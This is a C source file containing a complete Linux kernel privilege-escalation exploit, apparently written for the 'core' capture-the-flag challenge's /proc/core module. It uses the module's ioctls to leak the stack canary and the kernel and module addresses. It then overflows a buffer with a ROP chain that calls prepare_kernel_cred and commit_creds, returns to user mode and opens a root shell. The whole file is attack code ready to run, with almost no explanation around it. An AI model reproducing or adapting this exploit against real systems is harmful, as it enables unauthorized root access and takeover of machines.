#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

void core_change_offset(int fd, uint64_t off) {
	ioctl(fd, 0x6677889C, off);
}

void core_copy(int fd, int64_t len) {
	ioctl(fd, 0x6677889A, len);
}

void core_read(int fd, char* buf) {
	ioctl(fd, 0x6677889B, buf);
}

size_t user_ss, user_cs, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_ss, ss;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}

void get_shell() {
    if (!getuid()) {
        printf("[+] Privilege escalation successed !\n");
        system("/bin/sh");
    }
    printf("[-] Privilege escalation failed !\n");
}

size_t prepare_kernel_cred, commit_creds;
// ret2usr
void get_root() {
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;

    (*cc)((*pkc)(0));
}

int main()
{
    save_status();

    char buf[0x80] = {0};
    int fd = open("/proc/core", O_RDWR);

	core_change_offset(fd, 0x40);
	core_read(fd, buf); // leak

    uint64_t canary = ((uint64_t *)buf)[0];
    uint64_t maddr = ((uint64_t *)buf)[2] - 0x19b;
    uint64_t kaddr = ((uint64_t *)buf)[4] - 0x1dd6d1;

    printf("[*] maddr: 0x%lx\n", maddr);
    printf("[*] kaddr: 0x%lx\n", kaddr);
    printf("[*] canary: 0x%lx\n", canary);

    size_t iretq_ret = kaddr + 0x050ac2;
    size_t pop_rdi_ret = kaddr + 0xb2f;
    size_t mov_rdi_rax_jmp_rcx = kaddr + 0x1ae978;
    size_t pop_rcx_ret = kaddr + 0x21e53;
    size_t swapgs_pop_rbp_ret = maddr + 0xd6; // kernel module often has this gadget
    prepare_kernel_cred = kaddr + 0x9cce0;
    commit_creds = kaddr + 0x9c8e0;

    uint64_t ROP[30];
    int i = (0x40 / 0x8);
    // 0x40 garbage
    ROP[i++] = canary; // 0x40
    ROP[i++] = 0; // 0x48 == rbx
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 0;
    ROP[i++] = prepare_kernel_cred; // new cred in rax
    ROP[i++] = pop_rcx_ret;
    ROP[i++] = commit_creds;
    ROP[i++] = mov_rdi_rax_jmp_rcx;
    ROP[i++] = swapgs_pop_rbp_ret;
    ROP[i++] = 0;
    ROP[i++] = iretq_ret;
    ROP[i++] = (size_t) get_shell;
    ROP[i++] = user_cs;
    ROP[i++] = user_rflags;
    ROP[i++] = user_sp;
    ROP[i++] = user_ss; // 15

    write(fd, ROP, 0x8*30); // write into name
    core_copy(fd, 0xffffffffffff0000 | 0x8*30); // unsigned int16

    return 0;
}
